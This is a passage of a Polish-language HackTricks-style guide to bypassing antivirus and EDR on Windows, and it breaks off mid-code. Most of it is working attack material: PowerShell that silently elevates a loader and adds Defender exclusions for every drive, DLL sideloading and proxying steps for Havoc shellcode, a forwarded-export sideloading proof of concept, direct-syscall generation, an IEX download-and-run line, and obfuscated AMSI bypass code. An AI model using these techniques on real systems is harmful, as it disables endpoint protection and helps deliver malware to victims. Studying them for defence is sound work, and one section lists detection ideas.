# Obejście programu antywirusowego (AV)

{{#include ../banners/hacktricks-training.md}}

**Autorem pierwotnej wersji tej strony jest** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie zatrzymujące działanie Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie zatrzymujące działanie Windows Defendera przez podszywanie się pod inny program antywirusowy.
- [Wyłącz Defendera, jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed manipulowaniem Defenderem

Publiczne loadery podszywające się pod cheaty do gier często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień**, a dopiero potem wyłączają Defendera. Schemat jest prosty:

1. Sprawdź, czy proces działa z uprawnieniami administratora, używając `net session`. Polecenie powiedzie się tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast uruchom ponownie sam loader z czasownikiem `RunAs`, aby wywołać oczekiwany monit UAC o zgodę, zachowując oryginalny wiersz poleceń.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Ofiary już wierzą, że instalują „crackowane” oprogramowanie, więc zazwyczaj akceptują monit, przyznając malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` obejmujące wszystkie litery dysków

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoadera maksymalizują martwe pola Defendera, zamiast całkowicie wyłączać usługę. Loader najpierw zabija proces pilnujący GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, aby żaden profil użytkownika, katalog systemowy ani dysk wymienny nie podlegał skanowaniu:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload umieszczony gdziekolwiek na dysku zostanie zignorowany**.
- Wykluczenie rozszerzenia `.sys` jest przewidziane na przyszłość — atakujący zachowują sobie możliwość późniejszego ładowania niepodpisanych sterowników bez ponownego modyfikowania Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub je rozszerzyć bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, naiwne kontrole kondycji nadal zgłaszają, że „antywirus jest aktywny”, mimo że inspekcja w czasie rzeczywistym nie obejmuje tych ścieżek.<sup>[[26]](#references)</sup>

## **Metodologia unikania AV**

Obecnie AV wykorzystują różne metody sprawdzania, czy plik jest złośliwy: detekcję statyczną, analizę dynamiczną, a w przypadku bardziej zaawansowanych EDR-ów — analizę behawioralną.

### **Detekcja statyczna**

Detekcja statyczna polega na oznaczaniu znanych złośliwych ciągów znaków lub tablic bajtów w pliku binarnym albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itp.). Oznacza to, że używanie znanych, publicznych narzędzi może sprawić, że łatwiej zostaniesz wykryty, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na ominięcie tego rodzaju detekcji:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować jakiegoś loadera, który odszyfruje program i uruchomi go w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka ciągów znaków w pliku binarnym lub skrypcie, aby ominąć AV, ale może to być czasochłonne, zależnie od tego, co próbujesz poddać obfuskacji.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będą istnieć znane sygnatury wskazujące na złośliwe działanie, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem na sprawdzenie, czy Windows Defender wykryje plik statycznie, jest użycie [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Narzędzie dzieli plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno. Dzięki temu może wskazać dokładnie, które ciągi znaków lub bajty w pliku binarnym zostały oznaczone.

Gorąco polecam tę [playlistę na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) poświęconą praktycznym metodom unikania AV.

### Testy cech PE offline dla klasyfikatorów statycznych

Bajty payloadu spakowanego lub zaszyfrowanego to tylko jedno z wejść klasyfikatora statycznego. EMBER2024 wyodrębnia cechy PE, w tym importy, eksporty, sekcje, nagłówki i dane Authenticode.<sup>[[48]](#references)</sup> W jednym eksperymencie z loaderem dodanie 141 importów wyglądających na nieszkodliwe obniżyło wynik złośliwości EMBER2024 o 93%, podczas gdy importy powiązane ze złośliwym oprogramowaniem podniosły go. Dotyczy to tego modelu i tych próbek — nie jest to niezawodny sposób na ominięcie konkretnego produktu AV/EDR.<sup>[[50]](#references)</sup>

Podczas testu loadera przeprowadzanego za zgodą utrzymuj payload i ścieżkę wykonania bez zmian, modyfikuj tylko jedną zamierzoną zmienną kompilacji w każdym wariancie i porównuj wyniki offline. Sprawdź wynikowe cechy PE, ponieważ zmiana kompilacji może wpłynąć na więcej niż jedną grupę cech.<sup>[[49]](#references)[[50]](#references)</sup> Aby zachować zamierzone importy w IAT, wywołuj wybrane API Win32 z osiągalnego kodu. Zmieniaj ich zestaw i rozmieszczaj miejsca wywołań w różnych kompilacjach, zamiast tworzyć stałą funkcję maskującą, która może stać się sygnaturą. W eksperymencie odnotowano również niższe wyniki dla prawidłowego podpisywania kodu, wpisów eksportu oraz większej liczby funkcji powiększających `.pdata`; nieprawidłowy podpis miał niewielki wpływ, a efekt `.pdata` był mały.<sup>[[50]](#references)</sup>

Pakiet `thrember` udostępnia ekstrakcję cech i modele porównawcze. Po jego zainstalowaniu użyj `thrember.download_models("models")` z istniejącym katalogiem `models`, a następnie uruchom narzędzie oceniające z katalogu nadrzędnego — funkcja pobierania zmienia bieżący katalog roboczy. Klasyfikator PE może oceniać katalog z kompilacjami bez przesyłania ich do usługi skanującej:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Utrzymuj te same wersje modelu i ekstraktora cech podczas porównania. Niższy wynik offline pokazuje jedynie, jak ten klasyfikator reaguje na zmieniony plik binarny; nie dowodzi to uniknięcia analizy behawioralnej, emulacji ani użycia innego modelu dostawcy.<sup>[[49]](#references)[[50]](#references)</sup> Informacje o [polimorfizmie dla każdej kompilacji i kamuflażu zewnętrznego pliku binarnego w zwirtualizowanych payloadach](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) znajdziesz w opisie osobnego modelu wykonywania.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu przez AV twojego pliku binarnego w sandboxie i obserwowaniu złośliwej aktywności (np. prób odszyfrowania i odczytania haseł z przeglądarki czy wykonania minidumpa LSASS). Ta część może być nieco trudniejsza, ale oto kilka sposobów na uniknięcie sandboxów.

- **Opóźnienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. AV mają bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie opóźnienia mogą utrudnić analizę plików binarnych. Problem w tym, że wiele sandboxów AV może po prostu pominąć opóźnienie — zależnie od jego implementacji.
- **Sprawdzanie zasobów maszyny** Sandboxy zwykle dysponują bardzo ograniczonymi zasobami (np. < 2 GB RAM), bo w przeciwnym razie mogłyby spowolnić maszynę użytkownika. Możesz też wykazać się kreatywnością, sprawdzając na przykład temperaturę procesora, a nawet prędkość wentylatorów — nie wszystko będzie dostępne w sandboxie.
- **Kontrole specyficzne dla maszyny** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny „contoso.local”, możesz sprawdzić domenę komputera i porównać ją z podaną przez siebie. Jeśli się nie zgadza, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH. Możesz więc sprawdzić nazwę komputera w swoim malware przed detonacją. Jeśli jest to HAL9TH, oznacza to, że program działa w sandboxie Defendera — możesz wtedy zakończyć jego działanie.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych świetnych wskazówek od [@mgeeky](https://twitter.com/mariuszbit), jak radzić sobie z sandboxami:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a>, kanał #malware-dev</p></figcaption></figure>

Jak już wspomnieliśmy w tym wpisie, **publiczne narzędzia** prędzej czy później **zostaną wykryte**, więc warto zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? A może możesz skorzystać z innego, mniej znanego projektu, który również zrzuca LSASS?

Prawdopodobnie lepsza jest ta druga opcja. Weźmy mimikatz: to prawdopodobnie jeden z najczęściej wykrywanych przez AV i EDR fragmentów malware, jeśli nie najczęściej wykrywany. Sam projekt jest świetny, ale trudno go używać do omijania AV, więc po prostu poszukaj alternatyw, które pozwolą osiągnąć twój cel.

> [!TIP]
> Modyfikując payloady w celu uniknięcia wykrycia, pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w Defenderze. I proszę, naprawdę **NIE PRZESYŁAJ PLIKÓW DO VIRUSTOTAL**, jeśli zależy ci na długoterminowym unikaniu wykrycia. Jeśli chcesz sprawdzić, czy dany AV wykrywa twój payload, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj go tam, aż uzyskasz zadowalający wynik.

## EXE a DLL

Jeśli to możliwe, zawsze **preferuj DLL-e w celu uniknięcia wykrycia**. Z mojego doświadczenia wynika, że pliki DLL są zwykle **znacznie rzadziej wykrywane i analizowane**, więc w niektórych przypadkach to prosty sposób na uniknięcie wykrycia (oczywiście jeśli twój payload może działać jako DLL).

Jak widać na tym obrazie, payload DLL z Havoc ma wskaźnik wykrycia 4/26 w serwisie antiscan.me, podczas gdy payload EXE ma wskaźnik 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Porównanie zwykłego payloadu EXE z Havoc i zwykłego DLL-a z Havoc w antiscan.me</p></figcaption></figure>

Poniżej pokażemy kilka sztuczek, dzięki którym pliki DLL będą jeszcze bardziej ukryte.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL stosowaną przez loader, umieszczając aplikację będącą celem i złośliwe payloady obok siebie.

Programy podatne na DLL Sideloading możesz znaleźć za pomocą [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

To polecenie wyświetli listę programów podatnych na DLL hijacking w katalogu "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Gorąco polecam **samodzielnie wyszukać programy podatne na DLL Hijack/Sideload**. Przy prawidłowym wykonaniu ta technika jest dość dyskretna, ale korzystanie z publicznie znanych programów podatnych na DLL Sideload może sprawić, że łatwo zostaniesz wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie oczekiwanej przez program nie spowoduje załadowania payloadu, ponieważ program oczekuje, że biblioteka DLL będzie zawierać określone funkcje. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania wykonywane przez program z biblioteki proxy (i złośliwej) DLL do oryginalnej biblioteki DLL, zachowując w ten sposób funkcjonalność programu i umożliwiając obsługę wykonania payloadu.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/).

Oto kroki, które wykonałem:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Ostatnie polecenie utworzy 2 pliki: szablon kodu źródłowego DLL oraz oryginalną DLL o zmienionej nazwie.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają współczynnik wykrywania 0/26 w [antiscan.me](https://antiscan.me)! Można to uznać za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam** obejrzeć [nagranie VOD S3cur3Th1sSh1t na Twitchu](https://www.twitch.tv/videos/1644171543) o DLL Sideloading, a także [film ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omówiliśmy.

### Nadużywanie eksportów przekazywanych dalej (ForwardSideLoading)

Moduły PE systemu Windows mogą eksportować funkcje, które są w rzeczywistości „forwarderami”: zamiast wskazywać kod, wpis eksportu zawiera ciąg ASCII w postaci `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, loader Windows:

- Ładuje `TargetDll`, jeśli nie został jeszcze załadowany
- Rozwiązuje `TargetFunc` z tego modułu

Ważne zachowania, które należy zrozumieć:
- Jeśli `TargetDll` jest KnownDLL, zostanie załadowany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, używana jest standardowa kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego przekazywanie.

Umożliwia to pośrednią metodę sideloadingu: znajdź podpisaną DLL, która eksportuje funkcję przekazywaną do modułu o nazwie niebędącej KnownDLL, a następnie umieść tę podpisaną DLL w tym samym katalogu co kontrolowana przez atakującego DLL o nazwie dokładnie takiej jak nazwa docelowego modułu. Gdy wywołany zostanie przekazywany eksport, loader rozwiąże przekazanie i załaduje Twoją DLL z tego samego katalogu, wykonując jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w systemie Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwany zgodnie ze standardową kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisaną systemową bibliotekę DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalna funkcja DllMain wystarczy, aby wykonać kod; nie musisz implementować przekazywanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Uruchom przekazywanie za pomocą podpisanego LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Zaobserwowane zachowanie:
- rundll32 (podpisany) ładuje side-by-side `keyiso.dll` (podpisany)
- Podczas rozpoznawania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Loader następnie ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące wyszukiwania:
- Skup się na przekierowanych eksportach, których moduł docelowy nie jest KnownDLL. KnownDLL są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Przekierowane eksporty można wyliczyć za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz spis forwarderów Windows 11, aby wyszukać potencjalne cele: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane biblioteki DLL ze ścieżek innych niż systemowe, a następnie ładujące z tego katalogu biblioteki DLL niebędące KnownDLLs o tej samej nazwie bazowej
- Generuj alerty dla łańcuchów procesów/modułów takich jak: `rundll32.exe` → `keyiso.dll` spoza katalogu systemowego → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj zasady integralności kodu (WDAC/AppLocker) i zabraniaj jednoczesnego zapisu i wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby po cichu załadować i uruchomić swój shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to ciągła gra w kotka i myszkę — to, co działa dzisiaj, jutro może zostać wykryte, więc nigdy nie polegaj na jednym narzędziu; jeśli to możliwe, łącz kilka technik evasion.

## Direct/Indirect Syscalls i ustalanie SSN (SysWhispers4)

EDR-y często umieszczają **inline hooks w trybie użytkownika** w stubach syscall w `ntdll.dll`. Aby ominąć te hooks, możesz wygenerować **direct** lub **indirect** stubs syscall, które ładują poprawny **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania hookowanego punktu wejścia eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (embedded)**: umieść instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez trafiania do eksportu `ntdll`).
- **Indirect**: wykonaj skok do istniejącego gadżetu `syscall` wewnątrz `ntdll`, aby przejście do jądra wyglądało tak, jakby pochodziło z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: unikaj umieszczania na dysku statycznej sekwencji opcode `0F 05`; wyszukuj sekwencję syscall w czasie działania.

**Odporne na hooks strategie ustalania SSN:**
- **FreshyCalls (VA sort)**: wywnioskuj SSN przez sortowanie stubów syscall według adresu wirtualnego zamiast odczytywania bajtów stubów.
- **SyscallsFromDisk**: zamapuj czysty `\KnownDlls\ntdll.dll`, odczytaj SSN z jego sekcji `.text`, a następnie usuń mapowanie (omija wszystkie hooki w pamięci).
- **RecycledGate**: połącz wnioskowanie SSN na podstawie sortowania VA z walidacją opcode, gdy stub jest czysty; jeśli jest hookowany, użyj wnioskowania na podstawie VA.
- **HW Breakpoint**: ustaw DR0 na instrukcji `syscall` i użyj VEH, aby przechwycić SSN z `EAX` w czasie działania, bez parsowania hookowanych bajtów.

Przykładowe użycie SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Podczas analizowania czystych eksportów syscall z `ntdll` x64 w celu odczytania SSN należy uwzględnić zarówno `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`), jak i tę samą sekwencję poprzedzoną przez `F3 0F 1E FA` (`endbr64`). Drugi wariant to stub z prefiksem CET: parser zakładający, że SSN zawsze znajduje się pod stałym offsetem, go nie wykryje. Jeśli inicjalizacja indirect-syscall nie powiedzie się i loader przejdzie na `GetProcAddress`, wywołania tych eksportów mogą ponownie napotkać hooki w trybie użytkownika.<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI powstało, aby zapobiegać „[malware działającemu bez plików](https://en.wikipedia.org/wiki/Fileless_malware)”. Początkowo AV potrafiły skanować tylko **pliki na dysku**, więc jeśli udało się wykonać payloady **bezpośrednio w pamięci**, AV nie mogły temu zapobiec, ponieważ nie miały wystarczającego wglądu.

Funkcja AMSI jest zintegrowana z następującymi komponentami systemu Windows.

- Kontrola konta użytkownika (UAC; podnoszenie uprawnień plików EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra Office VBA

Dzięki niej rozwiązania antywirusowe mogą analizować zachowanie skryptów, udostępniając ich treść w postaci niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wywoła następujący alert w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że dodaje prefiks `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, ale i tak zostaliśmy wykryci w pamięci przez AMSI.

Ponadto, począwszy od **.NET 4.8**, kod C# również jest sprawdzany przez AMSI. Dotyczy to nawet użycia `Assembly.Load(byte[])` do uruchomienia kodu w pamięci. Dlatego do wykonywania kodu w pamięci zaleca się używanie starszych wersji .NET (takich jak 4.7.2 lub wcześniejsze), jeśli chcesz uniknąć AMSI.

Istnieje kilka sposobów na ominięcie AMSI:

- **Obfuskacja**

Ponieważ AMSI opiera się głównie na wykrywaniu statycznym, modyfikacja skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak deobfuskować skrypty, nawet jeśli mają wiele warstw, więc obfuskacja może być złym rozwiązaniem — zależnie od sposobu jej wykonania. Przez to uniknięcie wykrycia nie jest takie proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych, więc zależy to od tego, w jakim stopniu dany skrypt został oflagowany.

- **AMSI Bypass**

Ponieważ AMSI działa przez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), można łatwo ingerować w jej działanie, nawet jako nieuprzywilejowany użytkownik. Ze względu na tę wadę implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Wymuszenie błędu**

Wymuszenie niepowodzenia inicjalizacji AMSI (`amsiInitFailed`) sprawi, że w bieżącym procesie skanowanie nie zostanie rozpoczęte. Informację tę jako pierwszy ujawnił [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerszemu wykorzystaniu tej metody.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Wystarczyła jedna linijka kodu PowerShell, aby uniemożliwić działanie AMSI w bieżącym procesie PowerShell. Ta linijka została oczywiście wykryta przez samo AMSI, więc aby skorzystać z tej techniki, trzeba ją nieco zmodyfikować.

Oto zmodyfikowany AMSI bypass, który pochodzi z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Pamiętaj, że ten wpis prawdopodobnie zostanie oznaczony po publikacji, więc jeśli planujesz pozostać niewykrytym, nie publikuj żadnego kodu.

**Memory Patching**

Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji „AmsiScanBuffer” w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG. Dzięki temu wynik rzeczywistego skanowania wyniesie 0, co jest interpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby zapoznać się ze szczegółowym wyjaśnieniem.

Istnieje również wiele innych technik bypassowania AMSI w powershellu. Więcej informacji znajdziesz na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) oraz w [**tym repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Przekierowanie wskaźnika skanowania AMSI COM zamiast patchowania `AmsiScanBuffer`

Inny bypass działający w obrębie procesu pozostawia punkt wejścia `AmsiScanBuffer` bez zmian. W opisywanym 64-bitowym loaderze .NET obiekt COM AMSI jest tworzony na podstawie CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` zwraca wskaźnik interfejsu, a slot jego vtable pod offsetem `0x18` jest używany jako cel wywołania skanowania. Loader patchuje natywny wskaźnik funkcji `Console.Clear()` niewielkim stubem x64, zmienia ten wpis vtable na stub za pomocą `VirtualProtect()`, a następnie przywraca pierwotne uprawnienia strony. Wymagane są zarówno 64-bitowa szerokość wskaźnika, jak i oczekiwany układ COM; nie jest to uniwersalny offset dla dowolnych interfejsów AMSI ani kompilacji. Wcześniej zaobserwowane etapy to [ładowanie sidecara signed AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) oraz [deserializacja RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Zaobserwowane bajty stubu to `41 C7 00 01 00 00 00 33 C0 C3`: zapisują **1** pod wskaźnikiem wyniku w `r8` i zwracają **0** w `eax`. Zatem twierdzenie, że wynik skanowania to `AMSI_RESULT_CLEAN` (0), myli wartość zwracaną `S_OK` z wyliczeniem wyniku. Zgodnie z udokumentowaną kolejnością `AMSI_RESULT`, wartość wyniku **1** oznacza `AMSI_RESULT_NOT_DETECTED`; nadal jest ona poniżej progu wykrywania.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjowane dopiero po załadowaniu amsi.dll do bieżącego procesu. Solidny, niezależny od języka bypass polega na założeniu hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i w tym procesie nie są wykonywane żadne skanowania.<sup>[[23]](#references)</sup>

Opis implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
